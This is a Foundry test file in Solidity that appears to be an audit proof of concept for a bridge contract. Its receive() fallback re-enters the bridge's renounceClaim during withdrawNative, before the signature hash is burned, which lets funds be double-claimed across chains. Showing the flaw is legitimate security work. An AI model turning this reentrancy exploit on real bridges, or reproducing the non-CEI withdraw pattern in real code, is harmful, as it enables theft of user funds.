// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import {Test, stdError} from "forge-std/Test.sol";
import "src/Issue8/TestBridge.sol";
import "src/helper/ERC20MockMintable.sol";

import "forge-std/console.sol";

contract IssueEightTest is Test {
    ERC20MockMintable testERC20;
    TestBridge testToETHBridge;
    TestBridge ETHtoTestBridge;

    function setUp() public {
        vm.chainId(1); //Mainnet

        testERC20 = new ERC20MockMintable("TestChain", "TEST");
        testERC20.mint(address(this), 10 ether);
        ETHtoTestBridge = new TestBridge(1, 6969, address(testERC20));

        vm.chainId(6969); // $TEST Chain
        testToETHBridge = new TestBridge(6969, 1, address(0));

        //Fund the liquidity of native $TEST tokens to testToETHBridge
        (bool sent,) = address(testToETHBridge).call{value: 100 ether}("");
        require(sent, "Failed to send Ether to the level");
    }

    function testCrossFunctionReentrancy() public {
        vm.chainId(1);

        //deposit 10 $TEST token on the ETH Mainnet
        vm.startPrank(address(this));
        testERC20.approve(address(ETHtoTestBridge), 10 ether); //apporve the ERC20 token
        ETHtoTestBridge.depositERC20(address(this), 10 ether);
        vm.stopPrank();

        // withdraw the 10 $TEST tokens on humans Chain
        vm.chainId(6969);

        vm.startPrank(address(this));

        //The core vulnerability lies in the "withdrawNative" function
        //As shown below, the function does not follow CEI, the signature is burnt post the external call
        //For simplicity purpose, lets assume the signature is already signed by SIGNER_ROLE
        console.log("Initiate the withdrawNative function");
        testToETHBridge.withdrawNative(address(this), 10 ether, 0, "Mock Signature");
    }

    //The fallback function
    receive() external payable {
        //helper function to calculate the withdraw hash
        bytes32 hashValue = testToETHBridge.getWithdrawMessageHash(address(this), 10 ether, 0);

        console.log(
            "Status of the hash post making the external call (withdrawNative): ",
            bool(testToETHBridge.signatureUsed(hashValue))
        );

        //Since the messageHash is not burnt, the attacker calls "renounceClaim" post "withdrawNative", to withdraw funds on the source chain as well apart from destination chain
        console.log("Calling the renounceClaim function as part of the contract's fallback function");
        testToETHBridge.renounceClaim(address(0), address(this), 10 ether, 0, "Mock Signature");

        //Note: Once the "renounceClaim" is called, there is code which listens to such an event and allows the user to withdraw their funds from the source chain

        console.log(
            "Status of the hash post making the call to renounceClaim: ", bool(testToETHBridge.signatureUsed(hashValue))
        );
    }
}
